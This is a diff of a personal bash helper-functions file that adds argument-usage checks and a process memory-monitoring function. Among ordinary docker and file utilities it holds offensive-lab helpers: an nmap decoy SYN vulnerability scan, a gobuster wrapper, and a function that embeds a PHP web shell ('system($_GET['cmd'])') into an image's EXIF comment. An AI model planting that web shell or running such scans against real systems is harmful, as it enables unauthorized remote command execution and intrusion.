@@ -5,7 +5,7 @@
 # import .env
 import() {
     set -a
-    source "$1"
+    source "${1:?"usage: import <env-file>"}"
     set +a
 }
 
@@ -16,7 +16,7 @@ docker-clean-all () {
 }
 
 docker-in() {
-    docker exec -it "$1" /bin/bash
+    docker exec -it "${1:?"usage: docker-in <container>"}" /bin/bash
 }
 
 docker-arch(){
@@ -86,7 +86,7 @@ local-ip(){
 
 # gobuster password authentication examples
 gobust() {
-    gobuster -e -u "$1" -w wordlist
+    gobuster -e -u "${1:?"usage: gobust <url>"}" -w wordlist
 }
 
 rsync_() {
@@ -130,23 +130,25 @@ scp_retry() {
 # It will not ping the target (-Pn) and will run a script to check for vulnerabilities
 # (--script vuln) and save the output to a file called scan_result.txt (-oN scan_result.txt).
 nmap-stealth-syn() {
-    nmap -sS -D RND:10,ME -Pn --script vuln -oN scan_result.txt "$1"
+    nmap -sS -D RND:10,ME -Pn --script vuln -oN scan_result.txt "${1:?"usage: nmap-stealth-syn <target>"}"
 }
 
 # Aggressive scan to determine host OS
 nmap-aggressive() {
-    nmap -Pn -A -T4 "$1"/24
+    nmap -Pn -A -T4 "${1:?"usage: nmap-aggressive <target>"}"/24
 }
 
 
 # add file to an image as a comment
 # exiftool must be installed
 embedd-to-image() {
+    : "${1:?"usage: embedd-to-image <text> <image-file>"}" "${2:?"usage: embedd-to-image <text> <image-file>"}"
     exiftool "-comment<=$1" "$2"
 }
 
 # embed php toy webbackdoor
 embedd-bd() {
+    : "${1:?"usage: embedd-bd <image-file>"}"
     echo "<?php system(\$_GET['cmd']);?>" > bd
     exiftool "-comment<=bd" "$1"
     rm bd
@@ -251,6 +253,7 @@ burn-usb-iso() {
 # show logs without weird sequences
 # sudo apt install colorized-logs
 logless(){
+    : "${1:?"usage: logless <logfile>"}"
     ansi2txt < $1 | less
 }
 
@@ -292,7 +295,7 @@ sup() {
 
 # wargames <user>
 wargames() {
-    ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password  -p 2220 "$1"@bandit.labs.overthewire.org
+    ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password  -p 2220 "${1:?"usage: wargames <user>"}"@bandit.labs.overthewire.org
 }
 
 vim-conflict() {
@@ -391,7 +394,7 @@ restart-plasma(){
 # ```
 normalize() {
     local normalize_name prefix temp
-    normalize_name="$1"
+    normalize_name=${1:?"usage: normalize <name> [prefix]"}
     prefix=${2:-""}
     temp="$prefix$(echo "$normalize_name" | tr '[:upper:]' '[:lower:]' | \
         sed 's/ \[[^]]*\]//g' | \
@@ -488,6 +491,27 @@ work_test() {
         echo "done $c"
     done
     echo "done end"
+}
+
+# watch a process for memory/thread leaks: monoom <name|pid> [interval_s]
+monoom() {
+    local target interval pid
+    target=${1:?"usage: monoom <name|pid> [interval_s]"}
+    interval=${2:-5}
+
+    if [[ "$target" =~ ^[0-9]+$ ]]; then
+        pid=$target
+    else
+        pid=$(pidof -s "$target") || { echo "no process '$target'"; return 1; }
+    fi
+
+    while sudo test -d "/proc/$pid"; do
+        echo "$(date +%T) rss_mb=$(( $(sudo awk '/VmRSS/{print $2}' "/proc/$pid/status") / 1024 ))" \
+            "threads=$(sudo ls "/proc/$pid/task" | wc -l)" \
+            "maps=$(sudo cat "/proc/$pid/maps" | wc -l)"
+        sleep "$interval"
+    done
+    echo "$(date +%T) pid $pid exited"
 }
 
 utils-help() {
